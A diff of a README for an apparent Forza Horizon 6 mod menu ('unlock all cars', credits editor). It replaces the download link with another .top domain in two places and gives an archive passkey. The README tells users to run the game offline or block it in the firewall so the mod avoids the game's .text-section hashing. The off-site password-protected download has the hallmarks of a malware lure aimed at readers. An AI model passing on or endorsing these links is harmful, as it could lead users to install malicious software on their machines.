@@ -6,7 +6,7 @@ Forza Horizon 6 mod menu with credits editor, wheelspins, unlock all cars, telep
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -104,7 +104,7 @@ Forza Horizon 6 periodically hashes its `.text` section. Any modification to tha
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 
 2. **Set Forza Horizon 6 to offline mode** — go to settings and set to solo, or block the game in your firewall.
 
